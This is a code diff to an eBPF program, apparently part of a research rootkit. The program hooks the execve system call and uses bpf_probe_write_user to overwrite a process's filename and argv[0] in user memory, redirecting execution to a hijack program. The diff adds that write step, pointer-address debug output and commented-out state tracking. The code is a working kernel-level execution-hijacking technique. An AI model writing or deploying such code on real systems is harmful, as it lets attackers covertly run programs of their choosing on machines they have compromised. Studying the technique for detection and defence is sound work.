@@ -37,8 +37,8 @@ volatile int hijacker_state = 0;
  * @return 0 if OK, -1 if error exists
  */
 static __always_inline int test_write_user_unique(struct sys_execve_enter_ctx *ctx, char* org_filename, char* org_argv){
-    unsigned char* argv[1] = {0};
-    unsigned char filename[1] = {0};
+    char* argv[1] = {0};
+    char filename[1] = {0};
     char* chosen_comp_char = "w\0";
     if(ctx==NULL || ctx->argv == NULL|| org_filename==NULL){
         return -1;
@@ -63,7 +63,7 @@ static __always_inline int test_write_user_unique(struct sys_execve_enter_ctx *c
         return -1;
     };
     if(bpf_probe_read_user(&filename, 1, ctx->filename)<0){
-        bpf_printk("Error reading tets 2\n");
+        bpf_printk("Error reading test 2\n");
         return -1;
     };
     char argv_c;
@@ -91,9 +91,9 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
     }
     bpf_printk("Starting execve hijacker\n");
     
-    unsigned char* argv[NUMBER_ARGUMENTS_PARSED] = {0};
+    char* argv[NUMBER_ARGUMENTS_PARSED] = {0};
     //unsigned char* envp[PROGRAM_LENGTH] = {0};
-    unsigned char filename[ARGUMENT_LENGTH] = {0};
+    char filename[ARGUMENT_LENGTH] = {0};
     if(ctx==NULL || ctx->argv == NULL){
         return -1;
     }
@@ -112,6 +112,8 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
     bpf_printk("ARGV2: %s\n", argv[2]);
     //bpf_printk("ENVP: %s\n", envp);
     bpf_printk("FILENAME: %s\n", filename);
+    bpf_printk("&FILE: %llx, &ARGV0: %llx, &ARGV1: %llx\n", (void*)(ctx->filename), (void*)&(ctx->argv[0]), (void*)&(ctx->argv[1]));
+    //bpf_printk("&ARGV: %llx, &ARGV0: %llx\n", ctx->argv, argv[0]);
     if((void*)ctx->filename==(void*)(ctx->argv)){
         bpf_printk("Equal pointers");
     }else{
@@ -134,12 +136,14 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
        while others always work.
     2* The call not only overwrites the filename, but also argv[0] with a single write. This may be related to userspace programs using
        the same buffer for both filename and argv[0], since it is the same data in the end. Accordingly, when this event happens both
-       the pointers are very close to one another (196 bytes exactly), but not pointing to the same exact location, which is a mystery.
+       the pointers are very close to one another (196 bytes exactly), but not pointing to the same exact location, which is surprising.
     
     Another solution could be to hook do_execve and access the filename struct, which still contians
     an userspace buffer with filename inside. However if we failed to overwrite it before, we will too now.
     Also we can overwrite the return value of the syscall, pass the arguments to the internal ring buffer, read it from the
     user-side of the rootkit, and fork a process with the requested execve() call. I considered this not to be good enough.
+
+    Note: The arguments of this tracepoint are marked as const, so upon futher review we might have an undefined behaviour issue.
     */
 
     char to_write[sizeof(PATH_EXECUTION_HIJACK_PROGRAM)] = {0};
@@ -167,8 +171,23 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
         //bpf_printk("ARGV2: %s\n", argv[2]);
         return -1;
     }
-     
-    //hijacker_state = 1;
+    
+    int filename_len = 0;
+    for(int ii=0; ii<ARGUMENT_LENGTH; ii++){
+        if(filename[ii] == '\0'){
+            break;
+        }
+        filename_len++;
+    }
+    if(filename_len == 0){
+        return -1;
+    }
+    //Bpf pointer writing, not possible to be done directly to ctx->argv[0]
+    //TODO: Mention this in the report
+    if(bpf_probe_write_user((void*)argv[0], (void*)filename, filename_len)<0){
+        bpf_printk("Error writing to user memory by %s\n", filename);
+        return -1;
+    }
 
     unsigned char newfilename[ARGUMENT_LENGTH] = {0};
     unsigned char* newargv[NUMBER_ARGUMENTS_PARSED] = {0};
@@ -184,6 +203,22 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
     bpf_printk("NEW ARGV1: %s\n", newargv[1]);
     bpf_printk("NEW ARGV2: %s\n", newargv[2]);
     //bpf_printk("ORIGINAL %s\n\n", filename);
+
+    /*__u64 pid_tgid = bpf_get_current_pid_tgid();
+    if(pid_tgid<0){
+        return -1;
+    }
+    __u32 pid = pid_tgid >> 32;
+    struct exec_var_hijack_active_data *exec_hijack_data = (struct exec_var_hijack_active_data*) bpf_map_lookup_elem(&exec_var_hijack_active, &pid_tgid);
+    if (exec_hijack_data != NULL ){
+        //It means we have already performed this whole operation
+        return -1;
+    }
+
+    exec_hijack_data->hijack_state = 0;
+    exec_hijack_data->pid = pid;
+    bpf_probe_read(exec_hijack_data->argv0, 64, filename);
+    bpf_map_update_elem(&exec_var_hijack_active, &pid_tgid, &exec_hijack_data, BPF_ANY);*/
 
     return 0;
 }
